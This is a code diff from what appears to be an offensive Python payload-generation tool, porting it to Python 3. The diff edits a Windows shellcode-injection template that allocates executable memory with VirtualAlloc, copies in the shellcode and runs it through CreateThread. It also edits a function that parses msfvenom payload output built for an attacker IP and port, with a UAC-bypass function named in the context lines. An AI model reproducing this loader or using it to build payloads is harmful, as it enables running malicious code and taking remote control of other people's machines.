@@ -204,10 +204,9 @@ def windows_uac_bypass():
 
 
 injectwindows = """
-shellcode = bytearray('%s')
+shellcode = b'%s'
 ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(shellcode)),ctypes.c_int(0x3000),ctypes.c_int(0x40))
-bufe = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
-ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),bufe,ctypes.c_int(len(shellcode)))
+ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),shellcode,ctypes.c_int(len(shellcode)))
 ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(ptr),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))
 ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))
 """
@@ -310,7 +309,7 @@ def msfvenomGeneration(payload, ip, port):
     print('\r', end=' ')
     sys.stdout.flush()
 
-    payload = p.stdout.read()
+    payload = p.stdout.read().decode()
     compPayload = re.findall(r'"(.*?)"', payload)
 
     return ''.join(map(str, compPayload))
